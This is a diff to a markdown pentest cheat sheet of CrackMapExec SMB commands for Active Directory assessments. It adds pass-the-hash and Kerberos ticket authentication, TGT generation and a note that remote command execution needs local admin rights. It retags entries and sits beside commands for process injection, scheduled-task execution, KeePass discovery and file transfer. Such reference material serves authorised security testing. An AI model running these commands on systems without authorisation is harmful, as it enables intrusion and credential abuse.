@@ -57,15 +57,6 @@ Enumerate domain users.
 cme smb <dc-ip> -u <user> -p <password> --users
 ```
 
-## Enumerate domain computers
-#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user
-
-Enumerate domain computers.
-
-```bash
-cme smb <dc-ip> -u <user> -p <password> --computers
-```
-
 ## Enumerate null session
 #assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous
 
@@ -374,8 +365,17 @@ Authenticate via a domain account on the remote target.
 cme smb <ip> -u <user> -p <password> -d <domain>
 ```
 
-## Local-auth
+## Domain auth with hash
 #assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
+
+Authenticate via a domain account using the hash on the remote target.
+
+```bash
+cme smb <ip> -u <user> -H <hash> -d <domain>
+```
+
+## Local auth
+#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Local_user
 
 Authenticate via a local account on the remote target.
 
@@ -383,8 +383,8 @@ Authenticate via a local account on the remote target.
 cme smb <ip> -u <user> -p <password> --local-auth
 ```
 
-## Local-auth with hash
-#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
+## Local auth with hash
+#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Local_user
 
 Authenticate via a local account using the hash on the remote target.
 
@@ -395,13 +395,22 @@ cme smb <ip> -u <user> -H <hash> --local-auth
 ## Kerberos auth
 #assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
 
-Authenticate via a Kerberos ticket on the remote target.
-
-Previously import ticket : 
-export KRB5CCNAME=/tmp/ticket.ccache
+Authenticate via Kerberos on the remote target.
 
 ```bash
-cme smb <ip> --kerberos
+cme smb <ip> -u <user> -p <password> -k
+```
+
+## Kerberos TGT auth
+#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
+
+Authenticate via a Kerberos TGT on the remote target.
+
+Previously import ticket : 
+export KRB5CCNAME=ticket.ccache
+
+```bash
+cme smb <ip> -u <user> -k --use-kcache
 ```
 
 ## Delegated auth (RBCD)
@@ -797,29 +806,29 @@ cme smb <ip> -u <user> -p <password> -x 'logoff <id_user>' --no-output
 ```
 
 ## Execute remote commands (CMD)
-#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Execute remote commands through Windows CMD.
 
-⚠️ Requirement : Use --local-auth if the user is a local account
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
 
 ```bash
 cme smb <ip> -u <user> -p <password> -x <command>
 ```
 
 ## Execute remote commands (PowerShell)
-#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Execute remote commands through Windows PowerShell.
 
-⚠️ Requirement : Use --local-auth if the user is a local account
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
 
 ```bash
 cme smb <ip> -u <user> -p <password> -X <command>
 ```
 
 ## Execute remote commands with a specific method
-#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Execute remote commands through Windows CMD using a specific execution method (wmiexec, atexec, smbexec).
 
@@ -830,7 +839,7 @@ cme smb <ip> -u <user> -p <password> -x <command> --exec-method <method>
 ```
 
 ## Execute remote commands through Scheduled Tasks
-#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Admin
+#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Admin
 
 Execute remote commands on behalf of another user with an active session on the remote target, through Scheduled Tasks.
 
@@ -841,7 +850,7 @@ cme smb <ip> -u <user> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=
 ```
 
 ## Execute remote commands through Process Injection
-#assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Admin
+#assessment/AD #attack_type/Command_Execution #port/445 #port/139 #protocol/smb #access/Admin
 
 Execute remote commands on behalf of another user with an active session on the remote target, through Process Injection.
 
@@ -879,7 +888,7 @@ cme smb <ip> -u <user> -p <password> -M <scuffy_or_slinky> -o NAME=.thumbs.db CL
 ```
 
 ## Add a domain computer
-#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Allow to add a domain computer account.
 
@@ -888,7 +897,7 @@ cme smb <ip> -u <user> -p <password> -M add-computer -o NAME=<name> PASSWORD=<ma
 ```
 
 ## Delete a domain computer
-#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Allow to delete a domain computer account.
 
@@ -897,7 +906,7 @@ cme smb <ip> -u <user> -p <password> -M add-computer -o NAME=<name> DELETE=True
 ```
 
 ## Change a domain user password
-#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Allow to change a domain user's password. Valuable if the actual password has expired and must be changed (authentication status : STATUS_PASSWORD_MUST_CHANGE).
 (Notify the client about changing a user's password)
@@ -909,7 +918,7 @@ cme smb <ip> -u <user> -p <password> -M change-password -o NEWPASS=<newpass>
 ```
 
 ## Download SnippingTool screenshots
-#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Download screenshots taken by the (new) Snipping Tool on the remote target.
 
@@ -920,7 +929,7 @@ cme smb <ip> -u <user> -p <password> -M snipped
 ```
 
 ## KeePass discover
-#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Search for KeePass-related files and process on the remote target.
 
@@ -930,8 +939,28 @@ Search for KeePass-related files and process on the remote target.
 cme smb <ip> -u <user> -p <password> -M keepass_discover
 ```
 
+## Generate KRB5.conf file
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
+
+Generate a Kerberos configuration file for a given user.
+
+```bash
+cme smb <ip> -u <user> -p <password> --generate-krb5-file <path>
+export KRB5_CONFIG=<path>
+```
+
+## Generate TGT (.ccache file)
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
+
+Generate a Kerberos TGT as a .ccache file for a given user.
+
+```bash
+cme smb <ip> -u <user> -p <password> --generate-tgt <path>
+export KRB5CCNAME=<path>
+```
+
 ## List files in shares
-#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Spider shares files on a remote target. Search can be filter by file extension.
 
@@ -940,7 +969,7 @@ cme smb <ip> -u <user> -p <password> --spider <share> --pattern <file_extension>
 ```
 
 ## Put file
-#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
 
 Send a local file to the remote target.
 
@@ -949,9 +978,9 @@ cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Wind
 ```
 
 ## Get file
-#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+#assessment/AD #attack_type/Other #port/445 #port/139 #protocol/smb #access/Domain_user
 
-Get a local file grom the remote target.
+Get a local file from the remote target.
 
 ```bash
 cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
